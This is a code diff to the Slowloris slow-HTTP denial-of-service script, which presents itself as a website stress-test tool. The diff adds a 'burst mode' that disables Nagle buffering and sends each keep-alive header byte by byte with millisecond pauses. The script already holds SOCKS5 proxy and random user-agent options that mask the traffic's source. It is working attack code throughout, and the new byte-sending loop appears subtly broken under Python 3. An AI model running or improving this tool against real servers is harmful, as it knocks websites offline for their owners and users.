@@ -7,6 +7,7 @@ import ssl
 import sys
 import time
 
+
 parser = argparse.ArgumentParser(description="Slowloris, low bandwidth stress test tool for websites")
 parser.add_argument('host', nargs="?", help="Host to perform stress test on")
 parser.add_argument('-p', '--port', default=80, help="Port of webserver, usually 80", type=int)
@@ -14,6 +15,8 @@ parser.add_argument('-s', '--sockets', default=150, help="Number of sockets to u
 parser.add_argument('-v', '--verbose', dest="verbose", action="store_true", help="Increases logging")
 parser.add_argument('-w', '--waittime', dest="wait_time", default=15, help="Waiting time between keep-alives")
 parser.add_argument('-r', '--randomvariance', dest="rand_var", default=0, help="Maximum random variance between keep-alives")
+parser.add_argument('-b', '--burstmode', dest='burstmode', action='store_true', help="send keep-alives in bursts")
+parser.set_defaults(burstmode=False)
 parser.add_argument('-ua', '--randuseragents', dest="randuseragent", action="store_true", help="Randomizes user-agents with each request")
 parser.add_argument('-x', '--useproxy', dest="useproxy", action="store_true", help="Use a SOCKS5 proxy for connecting")
 parser.add_argument('--proxy-host', default="127.0.0.1", help="SOCKS5 proxy host")
@@ -33,6 +36,7 @@ if not args.host:
     print("Host required!")
     parser.print_help()
     sys.exit(1)
+
 
 if args.useproxy:
     # Tries to import to external "socks" library
@@ -81,7 +85,12 @@ user_agents = [
 ]
 
 def init_socket(ip):
+    
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    if args.burstmode:
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) #increase chance of single char packets in burst mode
+    
     s.settimeout(4)
     if args.https:
         s = ssl.wrap_socket(s)
@@ -114,7 +123,13 @@ def main():
         logging.info("Sending keep-alive headers... Socket count: %s", len(list_of_sockets))
         for s in list(list_of_sockets):
             try:
-                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+                content = "X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8")
+                if args.burstmode:
+                    for i,c in enumerate(content):
+                    	s.send(c)
+                    	time.sleep(0.001) # wait 1 msec to increase chance of additional TCP packets in burst mode
+                else:
+                    s.send(content)
             except socket.error:
                 list_of_sockets.remove(s)
 
